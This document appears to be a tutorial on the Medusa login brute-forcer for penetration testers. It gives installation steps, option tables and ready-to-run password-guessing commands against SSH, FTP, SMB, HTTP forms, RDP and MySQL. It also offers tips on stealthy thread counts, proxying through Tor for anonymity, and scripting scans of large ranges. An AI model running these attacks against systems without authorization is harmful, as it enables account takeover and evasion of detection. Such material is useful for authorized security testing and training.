
---

# 🔐 What is Medusa?

**Medusa** is a **fast, parallel, and modular login brute-forcer**. It is used for **online password brute-forcing** against various **network services** like SSH, FTP, Telnet, SMB, HTTP, RDP, MySQL, PostgreSQL, VNC, etc.

It supports **parallel testing of multiple hosts, users, and passwords**. It is ideal for **penetration testers**, **red teamers**, and **bug bounty hunters**.

---

## 🧠 Key Features

✅ **Fast** multithreaded brute-force tool
✅ Supports many **protocols**
✅ Can test **multiple usernames**, passwords, and hosts simultaneously
✅ Supports **modular design** — each protocol is a module
✅ Ability to **pause/resume** brute-force
✅ Built-in **output formatting**
✅ **Non-destructive** and **scriptable**

---

## 🛠️ Installation

### ✅ On Kali Linux / Debian-based

Medusa comes **pre-installed** on Kali.

If not:

```bash
sudo apt update
sudo apt install medusa -y
```

### ✅ On Arch-based

```bash
sudo pacman -S medusa
```

### ✅ On macOS (via brew)

```bash
brew install medusa
```

### ✅ From Source

```bash
git clone https://github.com/jmk-foofus/medusa.git
cd medusa
./configure
make
sudo make install
```

---

## 🧾 Syntax

```
medusa -h <host> -u <username> -p <password> -M <module> [options]
```

---

## 🧩 Supported Modules (Services)

You can list all supported modules:

```bash
medusa -d
```

Common modules:

| Module    | Service               |
| --------- | --------------------- |
| ssh       | SSH                   |
| ftp       | FTP                   |
| telnet    | Telnet                |
| http      | HTTP basic            |
| smbnt     | SMB/NTLM              |
| rdp       | Remote Desktop        |
| mysql     | MySQL                 |
| postgres  | PostgreSQL            |
| vnc       | VNC server            |
| mssql     | MS SQL                |
| http-form | HTTP form-based login |
| cvs       | CVS server            |
| nntp      | NNTP (Usenet)         |

---

## 📌 Basic Options

| Option | Description                                                                            |
| ------ | -------------------------------------------------------------------------------------- |
| `-h`   | Target host (or use `-H` for file of hosts)                                            |
| `-u`   | Username (or `-U` for file)                                                            |
| `-p`   | Password (or `-P` for file)                                                            |
| `-M`   | Module (e.g., ssh, ftp, http-form)                                                     |
| `-n`   | Port number                                                                            |
| `-t`   | Number of concurrent threads (default: 16)                                             |
| `-T`   | Total number of hosts to scan simultaneously                                           |
| `-e`   | Additional brute options: `n` = null password, `s` = username as password, `d` = blank |
| `-f`   | Stop after first valid username/password                                               |
| `-O`   | Output file                                                                            |
| `-vV`  | Verbose output                                                                         |
| `-x`   | Resume paused session                                                                  |
| `-r`   | Retry count for timeout connections                                                    |

---

# 🧪 Medusa Usage Examples

---

### ✅ 1. Brute Force FTP Login

```bash
medusa -h 192.168.1.10 -u admin -P /usr/share/wordlists/rockyou.txt -M ftp
```

📝 Explanation:

* Tries `admin:<passwords>` on FTP service
* Target = `192.168.1.10`
* Module = `ftp`

---

### ✅ 2. SSH Brute Force Using Username & Password Files

```bash
medusa -H ips.txt -U users.txt -P passwords.txt -M ssh -t 4 -vV
```

📝 Explanation:

* Target multiple hosts from `ips.txt`
* Use usernames from `users.txt`
* Use passwords from `passwords.txt`
* Attack SSH (`-M ssh`)
* 4 threads per host

---

### ✅ 3. SMB Null Session

```bash
medusa -h 192.168.1.5 -u "" -p "" -M smbnt -e n
```

📝 Explanation:

* Attempts null login to SMB
* `-e n` enables null password testing

---

### ✅ 4. HTTP Form Login Brute Force

This is for login forms like `/login.php`

```bash
medusa -h example.com -u admin -P passwords.txt -M http-form \
 -m FORM:"/login.php":"username=^USER^&password=^PASS^":"Login failed"
```

📝 Breakdown:

* `^USER^` and `^PASS^` are placeholders
* It checks for `"Login failed"` string to detect failed login

---

### ✅ 5. RDP (Remote Desktop Protocol) Brute Force

```bash
medusa -h 192.168.1.100 -U users.txt -P rockyou.txt -M rdp
```

---

### ✅ 6. Stop After First Success

```bash
medusa -h 192.168.1.10 -u admin -P passwords.txt -M ssh -f
```

📝 `-f` tells Medusa to **stop after first valid login** is found.

---

### ✅ 7. Brute Force MySQL Database

```bash
medusa -h 192.168.1.15 -u root -P /usr/share/wordlists/sql.txt -M mysql
```

---

## 📁 Output File

To save output to a file:

```bash
medusa -h 192.168.1.10 -u root -P passwords.txt -M ssh -O output.txt
```

---

## 🔄 Resume Session

```bash
medusa -x
```

You can pause Medusa (`Ctrl+C`) and resume later with `-x`.

---

## 📦 Example Scenario – SSH Brute Force

1. You have a host: `10.10.10.2`
2. You want to test if `admin` user has a weak password

```bash
medusa -h 10.10.10.2 -u admin -P /usr/share/wordlists/rockyou.txt -M ssh -t 4 -f
```

If successful:

```
ACCOUNT FOUND: [ssh] Host: 10.10.10.2 User: admin Password: password123
```

---

## ⚠️ Legal Warning

🔴 Use Medusa **only on systems you are authorized to test**. Unauthorized use is illegal and unethical.

---

## 📚 Best Wordlists for Medusa

* `/usr/share/wordlists/rockyou.txt`
* `SecLists`: [https://github.com/danielmiessler/SecLists](https://github.com/danielmiessler/SecLists)
* Custom lists based on recon (e.g., from `theHarvester`, `Amass`, etc.)

---

## 💡 Tips & Best Practices

* Use verbose mode `-vV` to see detailed output
* Use small thread count (`-t 2` or `-t 4`) for stealth
* Use `--proxy` or `tor` for anonymity (use with caution)
* Use Medusa in **combination with reconnaissance tools** for more success (e.g., `nmap`, `httpx`, `dnsx`)
* Automate Medusa via Bash scripts for scanning large ranges

---

## 🧩 Alternatives to Medusa

| Tool       | Notes                                                |
| ---------- | ---------------------------------------------------- |
| Hydra      | More widely used, similar to Medusa                  |
| Ncrack     | From Nmap team, highly reliable                      |
| Patator    | Modular brute-force tool, supports many protocols    |
| BruteSpray | Built on Medusa, auto-targets from Nmap scan results |

---

## 🔗 Official Resources

* 🔹 GitHub: [https://github.com/jmk-foofus/medusa](https://github.com/jmk-foofus/medusa)
* 🔹 Kali Linux Docs: [https://tools.kali.org/password-attacks/medusa](https://tools.kali.org/password-attacks/medusa)
* 🔹 Man Page: `man medusa`

---


